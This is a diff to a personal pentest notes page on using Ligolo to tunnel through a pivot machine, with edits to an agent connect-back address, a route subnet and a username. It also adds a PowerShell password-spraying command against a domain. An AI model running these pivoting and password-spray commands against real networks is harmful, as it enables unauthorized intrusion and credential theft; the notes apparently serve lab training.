@@ -1,3 +1,13 @@
+---
+title: Ligolo
+author: amandaguglieri
+draft: false
+TableOfContents: true
+tags:
+  - pentest
+  - tunelling
+---
+# Ligolo
 
 ## Installation
 
@@ -38,7 +48,7 @@ chmod +x ./proxy
 First, we need to create a tun interface:
 
 ```
-sudo ip tuntap add user [your_username] mode tun ligolo
+sudo ip tuntap add user lala mode tun ligolo
 sudo ip link set ligolo up
 ```
 
@@ -52,7 +62,7 @@ Second, start the proxy:
 Third, connect the agent (in the pivot machine) to our proxy in the kali:
 
 ```
-./agent -connect 10.10.14.14:11601 --ignore-cert
+./agent -connect 10.10.14.49:11601 --ignore-cert
 
 ```
 
@@ -69,5 +79,9 @@ session
 ifconfig
 
 # Add a route to the new interface (in a new kali terminal)
-sudo ip route add 172.16.1.0/24 dev ligolo
+sudo ip route add 172.16.139.0/24 dev ligolo
+
+
+
+Invoke-DomainPasswordSpray -Password '!QAZXCFGHJKOP' -OutFile spray_success -ErrorAction SilentlyContinue
 ```
